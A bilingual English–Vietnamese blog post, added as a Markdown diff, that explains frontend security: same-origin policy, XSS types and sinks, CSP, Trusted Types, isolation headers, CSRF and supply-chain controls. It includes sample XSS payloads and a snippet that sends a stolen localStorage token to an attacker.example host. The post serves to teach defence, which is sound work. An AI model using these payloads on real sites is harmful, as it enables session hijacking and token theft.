@@ -1,0 +1,417 @@
+---
+title: 'Frontend Security Architecture: Browser Model, XSS, CSP, and Defense-in-Depth'
+description: 'How the browser security model, XSS, CSP, isolation headers, and supply-chain controls form a layered defense for modern frontend systems.'
+pubDate: 2025-11-12
+tags: [security, xss, csp, web-security, frontend]
+draft: false
+---
+
+The browser is not a trusted runtime for your application logic \{Trình duyệt không phải môi trường runtime đáng tin cho logic ứng dụng của bạn\}. Every tab loads code from dozens of origins, executes it with near-native privileges, and exposes a vast attack surface through the DOM, storage APIs, and network stack \{Mỗi tab tải code từ hàng chục origin, thực thi với quyền gần như native, và lộ một attack surface rộng qua DOM, storage API và network stack\}. Senior frontend engineers do not treat security as a checklist item bolted onto a feature branch \{Kỹ sư frontend senior không coi security như một mục checklist gắn thêm vào feature branch\}. They architect defense-in-depth: layers that fail independently, headers that constrain execution, encoding that survives context switches, and threat models that assume compromise at every boundary \{Họ thiết kế defense-in-depth: các lớp fail độc lập, header ràng buộc execution, encoding sống sót qua context switch, và threat model giả định compromise ở mọi ranh giới\}.
+
+This post maps the browser security model from first principles through modern mitigations (2024–2026) \{Bài viết này map browser security model từ first principles qua các mitigation hiện đại (2024–2026)\}. We cover Same-Origin Policy, XSS taxonomy and sinks, Content Security Policy, cross-origin isolation, clickjacking, CSRF boundaries, supply-chain risk, and token storage — without re-teaching CORS or cookie mechanics in depth \{Chúng ta cover Same-Origin Policy, taxonomy và sink của XSS, Content Security Policy, cross-origin isolation, clickjacking, ranh giới CSRF, supply-chain risk và token storage — không dạy lại CORS hay cookie mechanics chi tiết\}.
+
+## The Same-Origin Policy: Foundation, Not Firewall
+
+The Same-Origin Policy (SOP) is the browser's primary isolation primitive \{Same-Origin Policy (SOP) là primitive isolation chính của trình duyệt\}. Two URLs share an **origin** when scheme, host, and port match exactly \{Hai URL cùng **origin** khi scheme, host và port khớp chính xác\}.
+
+| Component | Example A | Example B | Same origin? |
+|-----------|-----------|-----------|--------------|
+| Scheme | `https` | `https` | Yes |
+| Host | `app.example.com` | `app.example.com` | Yes |
+| Port | `443` (implicit) | `443` | Yes |
+| Full origin | `https://app.example.com` | `https://api.example.com` | **No** — host differs |
+| Full origin | `https://app.example.com` | `http://app.example.com` | **No** — scheme differs |
+
+**Site** is a coarser concept introduced for broader isolation (e.g., third-party cookie phase-out) \{**Site** là khái niệm thô hơn, dùng cho isolation rộng hơn (vd phase-out third-party cookie)\}. Registrable domains group subdomains: `app.example.com` and `cdn.example.com` are same **site** (`example.com`) but different **origins** \{Registrable domain gom subdomain: `app.example.com` và `cdn.example.com` cùng **site** (`example.com`) nhưng khác **origin**\}.
+
+### What SOP Protects
+
+SOP prevents one origin from reading another origin's responses via JavaScript \{SOP ngăn một origin đọc response của origin khác qua JavaScript\}. Your `https://bank.example` page cannot `fetch('https://evil.com/steal')` and inspect the body unless evil.com explicitly opts in via CORS \{Trang `https://bank.example` không thể `fetch('https://evil.com/steal')` rồi inspect body trừ khi evil.com opt-in qua CORS\}. It also blocks cross-origin DOM access: an iframe from `attacker.com` embedded in your page cannot read your DOM tree \{Nó cũng chặn truy cập DOM cross-origin: iframe từ `attacker.com` nhúng trong trang bạn không đọc được DOM tree\}.
+
+### What SOP Does Not Protect
+
+SOP does **not** stop your own origin from executing attacker-controlled strings \{SOP **không** ngăn origin của bạn thực thi chuỗi do attacker kiểm soát\}. If your app reflects user input into HTML without encoding, the attack runs **same-origin** — SOP is irrelevant \{Nếu app phản chiếu user input vào HTML không encode, tấn công chạy **same-origin** — SOP không liên quan\}. SOP does not prevent CSRF: the browser **will** attach cookies to cross-site requests unless other controls intervene \{SOP không chặn CSRF: trình duyệt **sẽ** gắn cookie vào request cross-site trừ khi control khác can thiệp\}. SOP does not validate that scripts you load are benign — only that they run with your origin's privileges once loaded \{SOP không validate script bạn tải là benign — chỉ đảm bảo chúng chạy với quyền origin bạn sau khi load\}.
+
+> **Principal insight:** SOP defines trust boundaries between origins, not within your application. Your threat model must assume any string crossing an HTML, JavaScript, URL, or CSS context boundary can become code execution.
+>
+> **Principal insight:** SOP định nghĩa trust boundary giữa các origin, không phải trong ứng dụng. Threat model phải giả định mọi chuỗi vượt ranh giới HTML, JavaScript, URL hoặc CSS context có thể thành code execution.
+
+## Cross-Site Scripting (XSS): Taxonomy and Mechanics
+
+XSS is injection where attacker-controlled data becomes executable script in a victim's browser context \{XSS là injection khi dữ liệu attacker kiểm soát trở thành script executable trong browser context của nạn nhân\}. All XSS variants share one property: they violate the assumption that "data stays data" \{Mọi biến thể XSS đều vi phạm giả định "data vẫn là data"\}.
+
+### Reflected XSS
+
+Attacker crafts a URL containing a payload; the server echoes it into the response without encoding \{Attacker tạo URL chứa payload; server echo vào response không encode\}. Victim clicks the link; the payload executes in the victim's session \{Nạn nhân click link; payload chạy trong session nạn nhân\}.
+
+```http
+GET /search?q=<script>fetch('/api/transfer',{method:'POST',body:'to=attacker&amount=1000'})</script> HTTP/1.1
+Host: shop.example.com
+```
+
+The server might render:
+
+```html
+<p>Results for: <script>fetch('/api/transfer', ...)</script></p>
+```
+
+Impact is often session-scoped and requires social engineering, but automated scanners and open redirects amplify reach \{Impact thường theo session và cần social engineering, nhưng scanner tự động và open redirect khuếch đại phạm vi\}.
+
+### Stored XSS
+
+Payload persists server-side (database, comment, profile field) and executes for every user who views the contaminated resource \{Payload tồn tại phía server (database, comment, profile field) và chạy cho mọi user xem resource bị nhiễm\}. Stored XSS is the highest-severity frontend-adjacent bug class because it scales horizontally across users without per-victim URLs \{Stored XSS là class bug frontend-adjacent nghiêm trọng nhất vì scale ngang qua user không cần URL riêng từng nạn nhân\}.
+
+### DOM-Based XSS
+
+The server returns safe HTML, but client-side JavaScript reads attacker input from `location.hash`, `postMessage`, or `localStorage` and writes it to a **sink** without sanitization \{Server trả HTML an toàn, nhưng JavaScript client đọc input attacker từ `location.hash`, `postMessage`, hoặc `localStorage` rồi ghi vào **sink** không sanitize\}. Static analysis and server-side scanners miss these because the vulnerable write happens entirely in the browser \{Static analysis và scanner server-side bỏ sót vì write vulnerable xảy ra hoàn toàn trong trình duyệt\}.
+
+```js
+// Vulnerable: hash flows to innerHTML
+const params = new URLSearchParams(location.hash.slice(1));
+document.getElementById('bio').innerHTML = params.get('text');
+// ?text=<img src=x onerror=alert(document.cookie)> in hash
+```
+
+### Sinks: Where Data Becomes Code
+
+A **sink** is any API that parses or executes its input as code or markup \{**Sink** là API nào parse hoặc execute input như code hoặc markup\}. Know these cold:
+
+| Sink category | Examples | Risk |
+|---------------|----------|------|
+| HTML injection | `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML` | Script execution via `<script>`, event handlers |
+| JavaScript execution | `eval`, `new Function`, `setTimeout(string)`, `setInterval(string)` | Direct arbitrary code |
+| URL navigation | `location.href = userInput`, `window.open(userInput)` | `javascript:` URLs |
+| Framework escape hatches | React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `[innerHTML]` | Same as HTML sinks, often with false confidence |
+| Template literals in JS | Dynamic script construction | `"${userInput}"` in `<script>` blocks |
+
+Modern frameworks auto-escape text interpolations (`\{userName\}` in JSX renders escaped text) \{Framework hiện đại tự escape text interpolation (`\{userName\}` trong JSX render text đã escape)\}. They do **not** protect raw HTML sinks or `javascript:` URLs in attributes like `href=\{userUrl\}` when the URL is not validated \{Chúng **không** bảo vệ raw HTML sink hay URL `javascript:` trong attribute như `href=\{userUrl\}` khi URL chưa validate\}.
+
+### Contextual Output Encoding
+
+Encoding is not one-size-fits-all \{Encoding không phải one-size-fits-all\}. The same string safe in HTML text may break out in an attribute or JavaScript string context \{Cùng một chuỗi an toàn trong HTML text có thể break out trong attribute hoặc JavaScript string context\}.
+
+| Context | Encode for | Example transform |
+|---------|------------|-------------------|
+| HTML text | `<`, `>`, `&`, quotes | `>` → `&gt;` |
+| HTML attribute | quotes, `<`, `&` | `"` → `&quot;` |
+| JavaScript string | quotes, backslash, newlines, `</script>` | `\` → `\\` |
+| URL parameter | RFC 3986 percent-encoding | space → `%20` |
+| CSS value | avoid injection via `expression()`, `url()` | strict allowlist |
+
+**Rule:** Encode at the last responsible moment, in the correct context, on output — not on input storage \{**Quy tắc:** Encode ở thời điểm cuối cùng chịu trách nhiệm, đúng context, khi output — không khi lưu input\}. Input validation (allowlists, length limits) complements encoding but does not replace it \{Input validation (allowlist, giới hạn độ dài) bổ sung encoding nhưng không thay thế\}.
+
+### DOMPurify and HTML Sanitization
+
+When you **must** render rich HTML (CMS content, WYSIWYG output), sanitization is mandatory \{Khi **bắt buộc** render rich HTML (CMS, output WYSIWYG), sanitization là bắt buộc\}. [DOMPurify](https://github.com/cure53/DOMPurify) is the de facto client/server library: it parses HTML in a detached DOM, strips dangerous nodes and attributes, and returns safe markup \{[DOMPurify](https://github.com/cure53/DOMPurify) là thư viện client/server de facto: parse HTML trong DOM tách, strip node và attribute nguy hiểm, trả markup an toàn\}.
+
+```js
+import DOMPurify from 'dompurify';
+
+const dirty = userProvidedHtml;
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+  ALLOWED_ATTR: ['href', 'title'],
+  ALLOW_DATA_ATTR: false,
+});
+
+element.innerHTML = clean; // Still a sink — but input is sanitized
+```
+
+Configure allowlists narrowly \{Cấu hình allowlist hẹp\}. Every allowed tag/attribute is a future CVE surface when browser parsing evolves \{Mỗi tag/attribute được phép là attack surface CVE tương lai khi browser parsing thay đổi\}. Re-sanitize on the server even if the client already did — defense in depth \{Sanitize lại trên server dù client đã làm — defense in depth\}.
+
+### Trusted Types API
+
+[Trusted Types](https://w3c.github.io/trusted-types/dist/spec/) shifts XSS prevention from convention to enforcement \{[Trusted Types](https://w3c.github.io/trusted-types/dist/spec/) chuyển phòng XSS từ convention sang enforcement\}. When enabled via CSP `require-trusted-types-for 'script'`, assigning a string to dangerous sinks throws unless the value is a `TrustedHTML`, `TrustedScript`, or `TrustedScriptURL` created by a registered policy \{Khi bật qua CSP `require-trusted-types-for 'script'`, gán string vào sink nguy hiểm throw trừ khi giá trị là `TrustedHTML`, `TrustedScript`, hoặc `TrustedScriptURL` tạo bởi policy đăng ký\}.
+
+```js
+// Register a policy (typically once at app bootstrap)
+const policy = trustedTypes.createPolicy('app', {
+  createHTML: (input) => DOMPurify.sanitize(input),
+  createScriptURL: (url) => {
+    const parsed = new URL(url, location.origin);
+    if (parsed.origin !== location.origin) throw new TypeError('External scripts blocked');
+    return parsed.href;
+  },
+});
+
+// Safe usage
+element.innerHTML = policy.createHTML(untrustedMarkup);
+
+// Throws TypeError — raw string rejected
+// element.innerHTML = untrustedMarkup;
+```
+
+Trusted Types integrates with CSP: together they eliminate an entire class of DOM XSS by making unsafe assignments a hard runtime error \{Trusted Types tích hợp CSP: cùng nhau loại bỏ cả class DOM XSS bằng cách biến assignment không an toàn thành runtime error cứng\}. Browser support is solid in Chromium; polyfills exist for gradual rollout \{Browser support tốt trên Chromium; polyfill có cho rollout dần\}.
+
+## Content Security Policy (CSP)
+
+CSP is an declarative execution firewall delivered via HTTP header (or `<meta>` with limitations) \{CSP là execution firewall khai báo qua HTTP header (hoặc `<meta>` với hạn chế)\}. It tells the browser which resources may load and which capabilities are denied \{Nó báo trình duyệt resource nào được load và capability nào bị từ chối\}.
+
+### Directives That Matter
+
+| Directive | Purpose |
+|-----------|---------|
+| `default-src` | Fallback for unspecified fetch directives |
+| `script-src` | Controls JavaScript execution sources |
+| `style-src` | CSS sources (inline styles need nonces/hashes or `'unsafe-inline'`) |
+| `connect-src` | `fetch`, XHR, WebSocket, EventSource targets |
+| `frame-ancestors` | Who may embed this page (clickjacking defense) |
+| `base-uri` | Restricts `<base href>` — prevents base tag hijacking |
+| `object-src` | Blocks plugins (`'none'` recommended) |
+| `require-trusted-types-for` | Enables Trusted Types enforcement |
+| `upgrade-insecure-requests` | Auto-upgrade HTTP subresources to HTTPS |
+
+### Nonces vs Hashes vs Allowlists
+
+**Allowlists** (`script-src https://cdn.example.com`) fail in practice: CDNs host JSONP endpoints, Angular bundles, and legacy polyfills that become script gadgets \{**Allowlist** (`script-src https://cdn.example.com`) fail thực tế: CDN host JSONP endpoint, Angular bundle và polyfill legacy thành script gadget\}. Any JSONP or file upload on an allowlisted origin becomes a bypass vector \{Mọi JSONP hoặc file upload trên origin trong allowlist thành bypass vector\}.
+
+**Nonces** are cryptographically random, per-response values injected into both the CSP header and each permitted `<script>` tag \{**Nonce** là giá trị random mỗi response, inject vào cả CSP header và mỗi thẻ `<script>` được phép\}.
+
+```http
+Content-Security-Policy: script-src 'nonce-abc123xyz' 'strict-dynamic'; object-src 'none'; base-uri 'none';
+```
+
+```html
+<script nonce="abc123xyz" src="/app.js"></script>
+<script nonce="abc123xyz">/* inline bootstrap */</script>
+```
+
+**Hashes** pin exact inline script content: `script-src 'sha256-base64encodeddigest='` \{**Hash** ghim nội dung inline script chính xác: `script-src 'sha256-base64encodeddigest='`\}. Hashes work for static inline snippets but break on any whitespace change — impractical for dynamic apps \{Hash dùng cho inline snippet tĩnh nhưng vỡ khi đổi whitespace — không thực tế cho app dynamic\}.
+
+**`'strict-dynamic'`** (CSP Level 3) allows scripts loaded by a nonce/hash/trusted script to load further scripts without allowlisting every origin \{**`'strict-dynamic'`** (CSP Level 3) cho phép script load bởi nonce/hash/trusted script load thêm script mà không cần allowlist mọi origin\}. This is how modern bundler output survives strict CSP without maintaining fragile CDN lists \{Đây là cách output bundler hiện đại sống sót strict CSP mà không maintain CDN list dễ vỡ\}.
+
+### Report-Only and Reporting Endpoints
+
+Deploy CSP in **`Content-Security-Policy-Report-Only`** before enforcing \{Triển khai CSP trong **`Content-Security-Policy-Report-Only`** trước khi enforce\}. Violations are reported but not blocked — you collect telemetry on third-party scripts, legacy inline handlers, and build pipeline leaks \{Violation được report nhưng không block — thu telemetry về third-party script, inline handler legacy và leak build pipeline\}.
+
+```http
+Content-Security-Policy-Report-Only: script-src 'nonce-random' 'strict-dynamic'; report-uri /api/csp-report; report-to csp-endpoint
+Reporting-Endpoints: csp-endpoint="/api/csp-report"
+```
+
+The Reporting API (`report-to`) supersedes deprecated `report-uri` in modern browsers \{Reporting API (`report-to`) thay `report-uri` deprecated trên browser hiện đại\}. Aggregate reports in your observability stack; alert on new violation patterns after deploys \{Gom report trong observability stack; alert pattern violation mới sau deploy\}.
+
+### A Realistic Strict CSP (2026)
+
+For a nonce-based SSR app (Astro, Next.js with middleware, etc.):
+
+```http
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'nonce-{RANDOM}' 'strict-dynamic' https:;
+  style-src 'nonce-{RANDOM}';
+  img-src 'self' data: https:;
+  font-src 'self';
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'none';
+  object-src 'none';
+  require-trusted-types-for 'script';
+  trusted-types app dompurify;
+  upgrade-insecure-requests;
+```
+
+Trade-offs are real: `'strict-dynamic'` ignores host allowlists in supporting browsers (by design) \{Trade-off thật: `'strict-dynamic'` bỏ qua host allowlist trên browser hỗ trợ (by design)\}. Third-party widgets (analytics, chat) require nonce propagation or iframe isolation \{Widget third-party (analytics, chat) cần propagate nonce hoặc iframe isolation\}. `'unsafe-inline'` and `'unsafe-eval'` should be treated as temporary migration debt, not architecture \{`'unsafe-inline'` và `'unsafe-eval'` nên coi là nợ migration tạm, không phải kiến trúc\}.
+
+> **Why allowlists fail:** Google's CSP evaluators documented hundreds of bypasses via JSONP, Angular templates, and CDN path confusion. Nonce + strict-dynamic is the industry consensus for dynamic applications.
+>
+> **Vì sao allowlist fail:** CSP evaluator của Google ghi nhận hàng trăm bypass qua JSONP, Angular template và CDN path confusion. Nonce + strict-dynamic là consensus ngành cho app dynamic.
+
+## Cross-Origin Isolation and Related Headers
+
+Some powerful APIs (`SharedArrayBuffer`, high-resolution timers, `performance.measureUserAgentSpecificMemory`) require **cross-origin isolation** — a process-level guarantee that no untrusted cross-origin content shares your address space \{Một số API mạnh (`SharedArrayBuffer`, timer độ phân giải cao, `performance.measureUserAgentSpecificMemory`) cần **cross-origin isolation** — đảm bảo cấp process không có nội dung cross-origin không tin cậy chia sẻ address space\}.
+
+Cross-origin isolation requires **both**:
+
+```http
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp
+```
+
+| Header | Effect |
+|--------|--------|
+| **COOP** (`Cross-Origin-Opener-Policy: same-origin`) | Isolates browsing context group; popups cannot retain `window.opener` reference across origins |
+| **COEP** (`Cross-Origin-Embedder-Policy: require-corp`) | Blocks cross-origin resources unless they explicitly opt in to being embedded |
+| **CORP** (`Cross-Origin-Resource-Policy: same-origin` or `cross-origin`) | Declares whether a resource may be loaded cross-origin into a COEP page |
+
+Third-party assets (CDNs, fonts, analytics pixels) must send appropriate CORP/CORS headers or be proxied same-origin \{Asset third-party (CDN, font, analytics pixel) phải gửi CORP/CORS header phù hợp hoặc proxy same-origin\}. This is a significant integration cost — plan it before adopting `SharedArrayBuffer` in production WASM or media pipelines \{Đây là chi phí tích hợp đáng kể — lên kế hoạch trước khi dùng `SharedArrayBuffer` trong WASM hoặc media pipeline production\}.
+
+Verify isolation in DevTools:
+
+```js
+console.log(crossOriginIsolated); // true when COOP + COEP succeed
+console.log(typeof SharedArrayBuffer !== 'undefined'); // true when isolated
+```
+
+### Permissions-Policy
+
+[Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy) (formerly Feature-Policy) disables browser features at the document and iframe level \{[Permissions-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy) (trước là Feature-Policy) tắt browser feature ở cấp document và iframe\}. Default-deny sensitive capabilities:
+
+```http
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()
+```
+
+Apply least privilege: only delegate features to origins that need them via `allow` attributes on iframes \{Áp least privilege: chỉ delegate feature cho origin cần qua attribute `allow` trên iframe\}. This limits blast radius when a third-party embed is compromised \{Giới hạn blast radius khi embed third-party bị compromise\}.
+
+## Clickjacking: Frame Control
+
+Clickjacking overlays an invisible iframe of your site atop a decoy UI; clicks intended for the decoy trigger actions on your authenticated page \{Clickjacking phủ iframe vô hình của site bạn lên UI decoy; click định vào decoy kích hoạt action trên trang đã authenticated\}.
+
+**Legacy:** `X-Frame-Options: DENY` or `SAMEORIGIN` — simple but cannot express allowlists \{**Legacy:** `X-Frame-Options: DENY` hoặc `SAMEORIGIN` — đơn giản nhưng không express allowlist\}.
+
+**Modern:** CSP `frame-ancestors` replaces XFO with finer control:
+
+```http
+Content-Security-Policy: frame-ancestors 'none';
+# Or allow specific embedders:
+Content-Security-Policy: frame-ancestors 'self' https://partner.example.com;
+```
+
+Use `frame-ancestors` in new deployments; keep XFO as defense-in-depth for older user agents \{Dùng `frame-ancestors` trên deploy mới; giữ XFO defense-in-depth cho user agent cũ\}. For pages that must be embeddable (widgets), isolate embeddable routes with relaxed `frame-ancestors` and strict CSP on sensitive routes \{Với trang phải embed được (widget), tách route embeddable với `frame-ancestors` nới lỏng và CSP strict trên route nhạy cảm\}.
+
+## CSRF and SameSite: Brief Boundaries
+
+Cross-Site Request Forgery tricks a victim's browser into sending authenticated requests the victim did not intend \{Cross-Site Request Forgery lừa trình duyệt nạn nhân gửi request đã authenticated mà nạn nhân không chủ ý\}. The browser attaches session cookies automatically — SOP does not block the **request**, only reading the **response** \{Trình duyệt gắn session cookie tự động — SOP không chặn **request**, chỉ đọc **response**\}.
+
+Frontend-relevant mitigations (server-enforced, frontend-aware):
+
+- **SameSite cookies** (`SameSite=Lax` or `Strict`) — see the cookies deep-dive for semantics; `Lax` is the modern default in browsers \{**SameSite cookie** (`SameSite=Lax` hoặc `Strict`) — xem bài cookies deep-dive cho semantics; `Lax` là default hiện đại trên browser\}.
+- **CSRF tokens** — synchronizer token in forms or double-submit cookie pattern; SPAs must attach tokens to mutating `fetch` calls \{**CSRF token** — synchronizer token trong form hoặc double-submit cookie; SPA phải gắn token vào `fetch` mutating\}.
+- **Custom headers** — `fetch` with `X-Requested-With` or custom header triggers CORS preflight; simple cross-site form POSTs cannot set arbitrary headers \{**Custom header** — `fetch` với `X-Requested-With` hoặc custom header kích hoạt CORS preflight; form POST cross-site đơn giản không set header tùy ý\}.
+- **Origin/Referer validation** — server rejects requests with missing or mismatched `Origin` on state-changing endpoints \{**Origin/Referer validation** — server từ chối request thiếu hoặc lệch `Origin` trên endpoint đổi state\}.
+
+Do not rely on CORS alone for CSRF defense — CORS restricts **reading** responses, not **sending** requests with cookies \{Đừng chỉ dựa CORS cho CSRF — CORS hạn chế **đọc** response, không **gửi** request có cookie\}.
+
+## Supply-Chain Security
+
+Your bundle is the concatenation of thousands of transitive dependencies, any of which can exfiltrate data at runtime or during build \{Bundle là nối hàng nghìn dependency transitive, bất kỳ cái nào có thể exfiltrate data lúc runtime hoặc build\}. The `event-stream` / `flatmap-stream` incident (2018) and subsequent npm account takeovers established supply-chain attacks as routine threat modeling input \{Sự cố `event-stream` / `flatmap-stream` (2018) và takeover tài khoản npm sau đó đưa supply-chain attack vào threat modeling thường xuyên\}.
+
+### Dependency Hygiene
+
+| Control | Why |
+|---------|-----|
+| Lockfiles (`package-lock.json`, `pnpm-lock.yaml`) | Reproducible installs; CI fails on unexpected dependency drift |
+| `npm audit` / OSV / Snyk in CI | Known CVE detection (with false-positive triage) |
+| Minimal dependencies | Every package is code you did not write |
+| Pin major versions; review minor/patch diffs | Supply-chain publishes happen on patch releases |
+| `.npmrc` `ignore-scripts` in CI | Blocks lifecycle script execution during install (trade-off: some packages break) |
+
+### Subresource Integrity (SRI)
+
+When loading scripts/styles from CDNs you do not control, SRI verifies content against a cryptographic hash \{Khi load script/style từ CDN không kiểm soát, SRI verify nội dung với cryptographic hash\}.
+
+```html
+<script
+  src="https://cdn.example.com/lib/analytics.v2.min.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous"
+></script>
+```
+
+If the CDN is compromised, the hash mismatch blocks execution \{Nếu CDN bị compromise, hash lệch chặn execution\}. Regenerate hashes on every version bump — automate in build pipeline \{Regenerate hash mỗi lần bump version — tự động trong build pipeline\}.
+
+### Import Maps and Third-Party Scripts
+
+[Import maps](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap) control module resolution in the browser without bundlers \{[Import maps](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap) điều khiển module resolution trong browser không cần bundler\}. Treat mapped URLs like dependencies: pin versions, use SRI where possible, and CSP-restrict `script-src` \{Coi mapped URL như dependency: pin version, dùng SRI nếu có thể, và CSP hạn chế `script-src`\}.
+
+### Build-Time Script Execution
+
+`postinstall` scripts, `@babel/core` plugins, and custom Vite/Astro integrations execute with full filesystem and network access on developer machines and CI \{Script `postinstall`, plugin `@babel/core`, và tích hợp Vite/Astro custom chạy với full filesystem và network trên máy dev và CI\}. Compromised packages attack **before** your app ships \{Package bị compromise tấn công **trước** khi app ship\}. Mitigations: `--ignore-scripts` in CI with allowlist exceptions, dependency review on PRs, and [npm provenance](https://docs.npmjs.com/generating-provenance-statements) / Sigstore verification for published packages \{Mitigation: `--ignore-scripts` trong CI với exception allowlist, review dependency trên PR, và [npm provenance](https://docs.npmjs.com/generating-provenance-statements) / verify Sigstore cho package publish\}.
+
+## Secrets and Tokens on the Frontend
+
+Anything in JavaScript-accessible storage is readable by any script running on your origin — including XSS payloads and compromised third-party tags \{Mọi thứ trong storage JavaScript-accessible đều đọc được bởi script chạy trên origin — kể cả XSS payload và tag third-party bị compromise\}.
+
+### Why `localStorage` JWT Is Risky
+
+Storing access tokens in `localStorage` or `sessionStorage` exposes them to any same-origin script \{Lưu access token trong `localStorage` hoặc `sessionStorage` lộ cho mọi script same-origin\}. A single XSS bug becomes full account takeover with no httpOnly barrier \{Một bug XSS duy nhất thành account takeover toàn phần không có rào httpOnly\}.
+
+```js
+// Attacker payload after XSS:
+const token = localStorage.getItem('access_token');
+fetch('https://attacker.example/exfil', {
+  method: 'POST',
+  body: token,
+});
+```
+
+### httpOnly Cookies and BFF Pattern
+
+Session tokens in **httpOnly, Secure, SameSite** cookies are not readable from JavaScript — XSS cannot exfiltrate them directly \{Session token trong cookie **httpOnly, Secure, SameSite** không đọc được từ JavaScript — XSS không exfiltrate trực tiếp\}. Trade-off: SPAs need a Backend-for-Frontend (BFF) or same-origin API proxy to attach cookies server-side; pure client-side API calls to a separate API domain reintroduce token-in-JS patterns unless you use cookie-based auth with careful CORS (see the CORS deep-dive) \{Trade-off: SPA cần BFF hoặc API proxy same-origin để gắn cookie server-side; API call client-side thuần sang domain API riêng tái giới thiệu pattern token-in-JS trừ khi dùng cookie auth với CORS cẩn thận (xem bài CORS deep-dive)\}.
+
+### Token Theft Without Full XSS
+
+Malicious browser extensions, compromised npm packages in your bundle, and `postMessage` handlers without origin validation enable token theft without classic reflected XSS \{Extension trình duyệt độc, package npm trong bundle bị compromise, và handler `postMessage` không validate origin cho phép đánh cắp token không cần reflected XSS cổ điển\}. Short-lived access tokens + refresh rotation + binding tokens to DPoP or mTLS (where applicable) limit replay window \{Access token sống ngắn + refresh rotation + bind token với DPoP hoặc mTLS (nếu áp dụng) giới hạn cửa sổ replay\}.
+
+```js
+// Vulnerable postMessage handler
+window.addEventListener('message', (event) => {
+  // Missing: if (event.origin !== 'https://trusted.example') return;
+  handleOAuthCallback(event.data);
+});
+```
+
+Never pass tokens in URL fragments (OAuth implicit flow legacy) — they leak via Referer, browser history, and server logs \{Không truyền token trong URL fragment (OAuth implicit flow legacy) — lộ qua Referer, browser history và server log\}. Use Authorization Code with PKCE for public clients \{Dùng Authorization Code với PKCE cho public client\}.
+
+## Threat Modeling for Principal Engineers
+
+Security architecture is not a feature list — it is a prioritized response to modeled threats under explicit assumptions \{Security architecture không phải danh sách feature — là phản hồi có ưu tiên với threat được model dưới giả định rõ ràng\}.
+
+### STRIDE-Oriented Frontend View
+
+| STRIDE | Frontend manifestation | Primary controls |
+|--------|------------------------|------------------|
+| Spoofing | Fake login forms, typosquat CDN | CSP, SRI, visual integrity, auth UX |
+| Tampering | DOM manipulation, MITM scripts | CSP, SRI, HTTPS, Subresource checks |
+| Repudiation | Missing audit on client actions | Server-side logging (client logs are untrusted) |
+| Information disclosure | XSS exfiltration, `postMessage` leaks | Encoding, CSP `connect-src`, httpOnly cookies |
+| Denial of service | Main-thread bombs, memory exhaustion | Permissions-Policy, input limits, worker isolation |
+| Elevation of privilege | Prototype pollution → RCE gadgets | Object.freeze patterns, CSP, dependency audit |
+
+### Security Checklist (Deploy Gate)
+
+Use this as a release gate, not a one-time audit \{Dùng làm release gate, không phải audit một lần\}:
+
+**Headers and policy**
+
+- [ ] Strict CSP with nonces + `strict-dynamic`; no `'unsafe-eval'` in production
+- [ ] `frame-ancestors 'none'` (or explicit allowlist) on authenticated routes
+- [ ] `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` if using isolated APIs
+- [ ] `Permissions-Policy` default-deny on sensitive features
+- [ ] HSTS with preload consideration for apex domains
+- [ ] CSP Report-Only staging before enforcement changes
+
+**Application code**
+
+- [ ] No string-to-sink paths without sanitization or Trusted Types policy
+- [ ] Contextual encoding at every template boundary
+- [ ] `postMessage` handlers validate `event.origin` strictly
+- [ ] OAuth: Authorization Code + PKCE; no tokens in URLs
+- [ ] Dependencies pinned; lockfile committed; audit in CI
+
+**Authentication**
+
+- [ ] Session tokens in httpOnly cookies (or equivalent non-JS storage)
+- [ ] SameSite + Secure on all auth cookies
+- [ ] CSRF tokens on all state-changing server endpoints
+- [ ] Short-lived access tokens with rotation
+
+**Supply chain**
+
+- [ ] SRI on external scripts/styles
+- [ ] Build pipeline runs with restricted install scripts
+- [ ] Third-party scripts inventory matches CSP allowlist/nonce strategy
+
+**Verification**
+
+- [ ] DAST + manual XSS testing on DOM sinks and rich text paths
+- [ ] CSP violation dashboard monitored post-deploy
+- [ ] `crossOriginIsolated` verified if relying on SAB/WASM threads
+
+### Assume Breach, Layer Anyway
+
+No single control survives a determined attacker with XSS + weak CSP + tokens in `localStorage` \{Không control đơn lẻ sống sót attacker quyết tâm với XSS + CSP yếu + token trong `localStorage`\}. The goal is to increase attacker cost so bugs are contained, detected, and worthless before exfiltration \{Mục tiêu là tăng chi phí attacker để bug bị cô lập, phát hiện và vô dụng trước exfiltration\}. Principal engineers document which layers protect which assets, what fails open vs closed, and how incident response disables compromised third-party scripts without redeploying the entire app \{Principal engineer ghi rõ lớp nào bảo vệ asset nào, cái gì fail open vs closed, và incident response tắt script third-party bị compromise thế nào không redeploy cả app\}.
+
+## Closing Frame
+
+The browser gives every origin a powerful runtime and trusts you to not turn data into code \{Trình duyệt cho mỗi origin runtime mạnh và tin bạn không biến data thành code\}. Same-Origin Policy draws walls between sites; CSP, Trusted Types, and isolation headers draw walls within yours; encoding and sanitization keep user data in its lane; supply-chain discipline keeps strangers out of your build \{Same-Origin Policy vẽ tường giữa các site; CSP, Trusted Types và isolation header vẽ tường trong origin bạn; encoding và sanitization giữ user data đúng lane; supply-chain discipline giữ người lạ khỏi build\}. None of these replace secure server-side authorization — the frontend can only raise the cost of abuse, never enforce trust \{Không cái nào thay authorization server-side an toàn — frontend chỉ tăng chi phí abuse, không enforce trust\}. Architect accordingly: fail closed, report violations, and treat every string as hostile until proven otherwise \{Thiết kế cho phù hợp: fail closed, report violation, và coi mọi chuỗi là hostile cho đến khi chứng minh ngược lại\}.
